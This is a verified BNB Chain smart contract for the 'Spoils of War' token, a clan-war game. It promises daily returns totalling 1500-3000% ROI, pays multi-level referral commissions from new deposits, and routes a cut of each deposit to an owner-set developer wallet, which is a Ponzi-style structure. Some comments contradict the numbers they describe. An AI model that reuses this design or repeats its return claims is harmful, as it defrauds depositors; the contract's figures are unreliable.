/**
 *Submitted for verification at BscScan.com on 2022-08-25
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract SpoilsOfWar is Context, Ownable, IBEP20 {
    using SafeMath for uint256;
	
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
	
    address payable public dev;  

    uint16 constant PERCENT_DIVIDER = 10000; 
    uint16[5] private ref_bonuses = [2500, 500, 300, 200, 100]; 

    uint256 public buys_bnb;
    uint256 public buys_token;

    uint256 public sells_bnb;
    uint256 public sells_token;
        
    uint256 public invest_bnb;
    uint256 public invest_token;
    
    uint256 public withdrawn;
    uint256 public ref_bonus;
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint8 clan; 
        uint256 dividends;        
        
        uint256 total_buy_bnb;
        uint256 total_buy_token;
        uint256 total_sell_bnb;
        uint256 total_sell_token;
        uint256 total_invest_token;
        uint256 total_refbonus;         
        
        uint40 lastWithdrawn;
        uint40 lastSwitched;
        
        Deposit[] deposits;
        uint256[5] structure;
        uint256[5] investments;        
    }

    mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;
  
    uint public nextMemberNo;
    uint256 private constant DAY = 24 hours;
    uint40 public dateLaunched;
    uint256[3] public clan_members = [10000, 10000, 10000]; // initial populations 
    uint256[3] public clan_leadership = [0, 0, 0];
    uint256[3] public clan_economy =    [0, 0, 0]; 
    uint256[3] public clan_arms =       [0, 0, 0]; 
    
    uint256[3] public clan_popfactor =     [0, 0, 0];
    uint256[3] public clan_ecofactor =     [0, 0, 0];
    uint256[3] public clan_excfactors =    [0, 0, 0]; 
    uint256[3] public clan_sellRates =     [1000000, 1000000, 1000000]; 
    
    uint256 constant BUYRATE  =  100000;
    uint256 constant SELLRATE = 1000000;

    constructor() {	    
        _name = "Spoils of War";
        _symbol = "SOW";
        _decimals = 18;
        _totalSupply =  1000000000000 * 10**uint(_decimals); // 1T
        
        _balances[address(this)] = 900000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), address(this), _balances[address(this)]);    
		
        _balances[msg.sender] = 100000000000 * 10**uint(_decimals); 
		emit Transfer(address(0), msg.sender, _balances[msg.sender]);		
        
		tarifs[200]  = Tarif(200, 3000); //15.00% daily for 200 days => 3000% ROI
        
        tarifs[100] = Tarif(100, 2500); //25.00% daily for 100 days => 2500% ROI
		tarifs[70]  = Tarif(70, 2100);  //70.00% daily for 70 days => 2100% ROI
        tarifs[40]  = Tarif(40, 1600);  //40.00% daily for 40 days => 1600% ROI
        tarifs[30]  = Tarif(30, 1500);  //30.00% daily for 30 days => 1500% ROI
        
        dev = payable(msg.sender);		
        dateLaunched = uint40(block.timestamp);

    }

    function BuyToken() public payable {
        require(msg.value >= 0.01 ether, "Minimum Buy is 0.01 BNB!");
        uint256 promo = 100;
        if(block.timestamp <= (dateLaunched + DAY * 10)) {
            promo = 300; //x3
        }else if(block.timestamp <= (dateLaunched + DAY * 20)) {
            promo = 250; //x2.5   
        }else if(block.timestamp <= (dateLaunched + DAY * 30)) {
            promo = 200; //x2
        }

        uint256 tokens = msg.value.mul(BUYRATE.mul(promo.div(100)));
        transferTokens(address(this), msg.sender, tokens);

        devSupport(msg.value,20);            

        Player storage player = players[msg.sender];        
        if(player.clan > 0)
        {
            player.total_buy_bnb += msg.value;       
            player.total_buy_token += tokens;       
         
            clan_economy[player.clan-1] += msg.value;
            commissionPayouts(msg.sender, msg.value);
        }
        buys_token += tokens;
        buys_bnb += msg.value;
    }

	function SellToken(uint256 amount) external {   

        //if(block.timestamp <= (dateLaunched + DAY * 30)) {
        //    return;
        //}
            
        transferTokens(msg.sender, address(this), amount);

        Player storage player = players[msg.sender];    
        
        uint256 bnb;
        if(player.clan > 0)
        {
            bnb = amount.div(clan_sellRates[player.clan-1] - clan_excfactors[player.clan-1]); 

            player.total_sell_bnb += bnb;
            player.total_sell_token += amount;
            //decrease economy
            uint256 eco = SafeMath.div(SafeMath.mul(bnb, 50), 100);
            clan_ecofactor[player.clan-1] += eco;
        
        }else{
            bnb = amount.div(SELLRATE); 
        }

        payable(msg.sender).transfer(bnb);        
        
        sells_token += amount;
        sells_bnb += bnb;

        withdrawn += bnb;
    }
   
    function SignUp(address referral, uint8 clan, uint8 quickinvest) public payable {
        require(msg.value >= 0.01 ether, "Minimum BNB to start is 0.01 BNB!");

        Player storage player = players[msg.sender];
        require(player.clan == 0, "Already a Member!");

        player.clan = clan;
        setUpline(msg.sender, referral, clan);

        uint256 tokens = msg.value.mul(BUYRATE);
      
        if(quickinvest > 0)
        {
            investToken(msg.sender, msg.value, tokens,100);
        }else{
            // hold the tokens
            transferTokens(address(this), msg.sender, tokens);
        }
            
        clan_economy[clan-1] += msg.value;

        devSupport(msg.value,10);     

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
                
        buys_token += tokens;
        buys_bnb += msg.value;

        commissionPayouts(msg.sender, msg.value);
    }

    function FundPolicies(uint8 sector, uint256 tokens) external {
        require(tokens >= 500 ether,"Too small to invest!");         
        
        Player storage player = players[msg.sender];    
        transferTokens(msg.sender, address(this), tokens);
        
        uint256 bnb = tokens.div(BUYRATE); 
        uint256 tarif = 100;       
        
        if(sector==1) {
            //help war efforts, invest in war bonds
            tarif = 30;
            clan_arms[player.clan-1] += bnb;        
            clan_leadership[player.clan-1] += SafeMath.mul(bnb, 0.1 ether); 
        }else if(sector==2) {
            //upgrade weapons and train more soldiers
            tarif = 40;
            clan_arms[player.clan-1] += bnb;        
            clan_leadership[player.clan-1] += SafeMath.mul(bnb, 0.5 ether);      
            clan_popfactor[player.clan-1] += SafeMath.div(bnb, 0.01 ether);
            clan_ecofactor[player.clan-1] += bnb; 
        }else if(sector==3) {
            //control population, eliminate spies and dissidents
            tarif = 70;
            clan_leadership[player.clan-1] += bnb;  
            clan_arms[player.clan-1] += SafeMath.mul(bnb, 0.1 ether); 
            clan_economy[player.clan-1] += bnb;
            clan_popfactor[player.clan-1] += SafeMath.div(bnb, 0.001 ether);
        }else if(sector==4) {
            //annex new territory
            tarif = 200;
            clan_economy[player.clan-1] += bnb;
            clan_leadership[player.clan-1] += bnb;       
            clan_members[player.clan-1] += SafeMath.div(bnb, 0.005 ether);           
        }     
        investToken(msg.sender, bnb, tokens, tarif);
        clan_excfactors[player.clan-1] += SafeMath.div(bnb, 0.02 ether);                   
    }   
    
    function CollectDividends() external {
        Player storage player = players[msg.sender];
        if(this.whosWinning() != player.clan){
            return;        
        }
        
        uint256 payout = this.computePayout(msg.sender);
        if(payout > 0) { 
            players[msg.sender].lastWithdrawn = uint40(block.timestamp);
            players[msg.sender].dividends += payout;
        }

        require(player.dividends > 0, "No Dividends Yet!");
        transferTokens(address(this), msg.sender, player.dividends);
        player.dividends = 0;
    }

    function Reinvest() external {
        //withdrawables to reinvest instead
        Player storage player = players[msg.sender];

        uint256 payout = this.computePayout(msg.sender);
        if(payout > 0) { 
            players[msg.sender].lastWithdrawn = uint40(block.timestamp);
            players[msg.sender].dividends += payout;
        }

        require(player.dividends > 0, "No Dividends Yet!");
        
        uint256 bnb = player.dividends.div(BUYRATE);         
        investToken(msg.sender, bnb, player.dividends,100);

        clan_leadership[player.clan-1] += bnb;        
        clan_economy[player.clan-1] += bnb;
        clan_excfactors[player.clan-1] += SafeMath.div(bnb, 0.02 ether);   

        player.dividends = 0;           
    }

    function SwitchAllegiance(uint8 clan) public payable {
        require(msg.value >= 0.01 ether, "Minimum BNB to switch side is 0.01 BNB!");
        
        Player storage player = players[msg.sender];
        require (block.timestamp >= (player.lastSwitched + DAY), "Can switch sides after 24 hrs since your last!");
        
        uint256 tokens = msg.value.mul(BUYRATE);
        transferTokens(address(this), msg.sender, tokens);
        
        if(clan_members[player.clan-1] >=1){
            clan_members[player.clan-1]--;
        }

        uint256 econ = SafeMath.div(SafeMath.mul(player.total_buy_bnb, 30), 100);
        clan_ecofactor[player.clan-1] += econ;
        
        player.clan = clan;

        clan_economy[clan-1] += (msg.value + econ);

        devSupport(msg.value,10);     

        player.total_buy_bnb += msg.value;       
        player.total_buy_token += tokens;       
                
        buys_token += tokens;
        buys_bnb += msg.value;

        commissionPayouts(msg.sender, msg.value);

        player.lastSwitched = uint40(block.timestamp);
    }


    function investToken(address _addr, uint256 bnb, uint256 tokens, uint256 _tarif) private {
        Player storage player = players[_addr];
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: tokens,
            time: uint40(block.timestamp)
        }));  
        
        player.total_invest_token += tokens;
        //player.total_invest_bnb += bnb;

        if(_tarif==100){
            player.investments[0] += bnb;
        }else if(_tarif==30){
            player.investments[1] += bnb;
        }else if(_tarif==40){
            player.investments[2] += bnb;
        }else if(_tarif==70){
            player.investments[3] += bnb;
        }else if(_tarif==200){
            player.investments[4] += bnb;
        }    

        invest_token += tokens;
        invest_bnb += bnb;
    }


    function devSupport(uint256 amount, uint256 perc) private {
        uint256 support = SafeMath.div(SafeMath.mul(amount, perc), 100);
        payable(dev).transfer(support); 
        withdrawn += support;          
    }


    function setUpline(address _addr, address _upline, uint8 clan) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {
            nextMemberNo++;
            clan_members[clan-1]++;
        
            if(_balances[_upline] <= 0) {
                _upline = owner();
            }
           
            players[_addr].upline = _upline;
           
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }          
        }
    }      
    
        
    function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            payable(up).transfer(bonus); 
            players[up].total_refbonus += bonus;

            ref_bonus += bonus;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }   
   
   
    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from;
            
            if(player.lastWithdrawn > player.lastSwitched){
                from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            }else{
                from = player.lastSwitched > dep.time ? player.lastSwitched : dep.time;
            }
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
        return value;
    }


    function memberInfo(address _addr) view external returns(uint256 for_withdraw, uint256 numDeposits, uint256[5] memory investments, uint256[5] memory structure) {       
        Player storage player = players[_addr];
        uint256 payout = this.computePayout(_addr);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
        for(uint8 i = 0; i < 5; i++) {
            investments[i] = player.investments[i];
        }
        return (payout + player.dividends, player.deposits.length, investments, structure);
    } 
    
    
    function memberDeposit(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)
    {
        Player storage player = players[_addr];
        Deposit storage dep = player.deposits[index];
        Tarif storage tarif = tarifs[dep.tarif];
        return(dep.time, dep.amount, tarif.life_days, tarif.percent);
    }
    

    function transferTokens(address _from, address _to, uint256 amount) private {
        require(_balances[_from].sub(amount) >= 0,"Not enough tokens!");        
        _balances[_to] = _balances[_to].add(amount);
        _balances[_from] = _balances[_from].sub(amount);
        emit Transfer(_from, _to, amount);
    }


    function whosWinning() view external returns(uint8 winner) {
        uint256[3] memory percentages;

        percentages[0] = 10; percentages[1] = 10; percentages[2] = 10;
        uint8 p = getMidPopulation(addFactors(clan_members[0], clan_popfactor[0]),
                                   addFactors(clan_members[1], clan_popfactor[1]),
                                   addFactors(clan_members[2], clan_popfactor[2]));
        if(p > 0){
            percentages[p-1] = 20;
        }        
        uint256 mx2 = getHighest(addFactors(clan_economy[0], clan_ecofactor[0]),
                                 addFactors(clan_economy[1], clan_ecofactor[1]),
                                 addFactors(clan_economy[2], clan_ecofactor[2]));
        
        percentages[0] += getPercentile(addFactors(clan_economy[0], clan_ecofactor[0]),mx2, 25); 
        percentages[1] += getPercentile(addFactors(clan_economy[1], clan_ecofactor[1]),mx2, 25); 
        percentages[2] += getPercentile(addFactors(clan_economy[2], clan_ecofactor[2]),mx2, 25); 
        
        uint256 mx3 = getHighest(clan_leadership[0],clan_leadership[1],clan_leadership[2]);
        percentages[0] += getPercentile(clan_leadership[0],mx3, 15); 
        percentages[1] += getPercentile(clan_leadership[1],mx3, 15); 
        percentages[2] += getPercentile(clan_leadership[2],mx3, 15); 

        uint256 mx4 = getHighest(clan_arms[0],clan_arms[1],clan_arms[2]);
        percentages[0] += getPercentile(clan_arms[0],mx4, 40); 
        percentages[1] += getPercentile(clan_arms[1],mx4, 40); 
        percentages[2] += getPercentile(clan_arms[2],mx4, 40); 
        
        if(percentages[0] > percentages[1] && percentages[0] > percentages[2]){
            return 1;
        }else if(percentages[1] > percentages[0] && percentages[1] > percentages[2]){
            return 2;
        }else if(percentages[2] > percentages[0] && percentages[2] > percentages[1]){
            return 3;
        }        
        return 0;        
    }
    

    function getHighest(uint256 a, uint256 b, uint256 c) pure private returns(uint256 value) {        
        if(a >= b && a >= c){
            return a;
        }else if(b >= a && b >= c){
            return b;    
        }else if(c >= a  && c >= b){
            return c;    
        }
        return 0;        
    }


    function getPercentile(uint256 a, uint256 h, uint256 p) pure private returns(uint256 value) {
        if(a == 0 || h == 0) { return 0; }
        return ((a / h * 100) * p) / 100;
    }

   
    function getMidPopulation(uint256 a, uint256 b, uint256 c) pure private returns(uint8 value) {        
      
        if(a > b && b > c){
            return 2;
        }else if(b > a && a > c){
            return 1;    
        }else if(b > c  && c > a){
            return 3;    
        }else if(a > b  && b == c){
            return 1;    
        }else if(b > a  && a == c){
            return 2;    
        }else if(c > b  && b == a){
            return 3;    
        }else if(a == b && a > c && c > 0){
            return 3;
        }else if(a == c && a > b && b > 0){
            return 2;
        }else if(b == c && b > a  && a > 0){
            return 1;
        }
        return 0;        
    }
  
    function addFactors(uint256 a, uint256 b) pure private returns(uint256 value) {
        if(a - b >= 0){
            return(a-b);
        }
        return 0;
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }  
 
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}